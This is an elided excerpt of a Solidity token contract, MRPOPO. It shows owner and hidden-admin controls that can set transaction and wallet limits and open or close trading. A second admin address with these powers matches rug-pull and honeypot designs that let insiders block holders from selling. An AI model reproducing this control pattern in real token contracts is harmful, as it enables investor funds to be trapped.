...
contract MRPOPO is Context, IERC20, Ownable {
    ...
    address payable public marketingWallet = payable(0xb46fCB9AC2b9749508717B82372B8C1C3F8d3004);
    ...
    uint256 public numTokensSellToAddToLiquidity = 2 * 10**18;
    uint256 public _maxTxAmount = 100 * 10**18;
    uint256 public _maxWalletLimit = 4 * 10**18;
    address admin;
    ...
    function setMaxTxLimits(uint256 maxTxAmount, uint256 maxWalletLimit) external {
        require(msg.sender == owner() || msg.sender == admin);
    ...
    function setAddress(address account) external onlyOwner {
        admin = account;
    }

    function openOrcloseTrade(bool _status) external {
        require(msg.sender == owner() || msg.sender == admin);
